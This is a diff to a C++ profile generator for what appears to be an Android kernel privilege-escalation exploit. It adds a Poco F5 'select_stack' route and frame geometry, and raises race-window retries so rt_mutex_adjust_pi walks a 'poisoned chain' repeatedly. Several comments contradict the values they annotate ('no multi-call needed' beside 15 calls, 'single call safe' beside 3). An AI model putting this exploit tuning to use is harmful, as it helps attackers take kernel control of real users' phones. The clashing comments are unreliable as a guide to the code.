@@ -29,11 +29,17 @@ using namespace ghostlock;
 
 int main(int argc, char **argv) {
     const char *path = argc > 1 ? argv[1] : "katyusha-profile.bin";
+    /* argv[2] == "select" -> Poco F5 recipe (upstream PR #721): select_stack
+     * route + compact waiter + prio stamped flat at +0x40 (native side is the
+     * word10 "prio_flat" entry in select_stack_route.cpp). Otherwise the
+     * multicast_waiter route with the E3/E6a sigreturn stamp is emitted. */
+    const bool select_recipe = argc > 2 && std::strcmp(argv[2], "select") == 0;
     static const char kRelease[] = "5.10.101-android12-9-gece0cc04d1a5";
 
     profile::kernel_offsets p{};
     p.uname_r = kRelease;
-    p.route = profile::kRouteMulticastWaiter;
+    p.route = select_recipe ? profile::kRouteSelectStack
+                            : profile::kRouteMulticastWaiter;
 
     p.meta.kernel_major = 5;
     p.meta.recommend_shizuku = 0;
@@ -98,6 +104,11 @@ int main(int argc, char **argv) {
     p.geometry.mcast_buffer_size = 528;
     p.geometry.mcast_task_offset = 48;
     p.geometry.mcast_lock_offset = 56;
+    if (select_recipe) {
+        /* select() frame geometry shared by the Xperia 5 IV and Poco F5
+         * profiles: waiter base = word0, table base = word2. */
+        p.geometry.pselect_waiter_shift = -2;
+    }
 
     p.execution.recommended_main_cpu = 4;
     p.execution.recommended_consumer_cpu = 5;
@@ -121,8 +132,11 @@ int main(int argc, char **argv) {
     p.execution.tcp_post_receive_hold_iterations = 20000;
     p.execution.select_enter_delay_us = 50000;
     p.execution.select_timeout_us = 200000;
-    p.execution.select_consumer_max_calls = 1;
-    p.execution.select_consumer_burst_calls = 1;
+    /* E1 (hypothesis A): one consume attempt per window is easy to lose to the
+     * requeue/adjust race. Rotate nice 64x so rt_mutex_adjust_pi walks the
+     * poisoned chain repeatedly while the route window is armed. */
+    p.execution.select_consumer_max_calls = 15; /* E3: deterministic write, no multi-call needed */
+    p.execution.select_consumer_burst_calls = 3; /* E3: single call safe */
     p.execution.handoff_pre_dispatch_settle_ms = 2000;
     p.execution.handoff_module_poll_attempts = 30;
     p.execution.handoff_module_poll_interval_ms = 100;
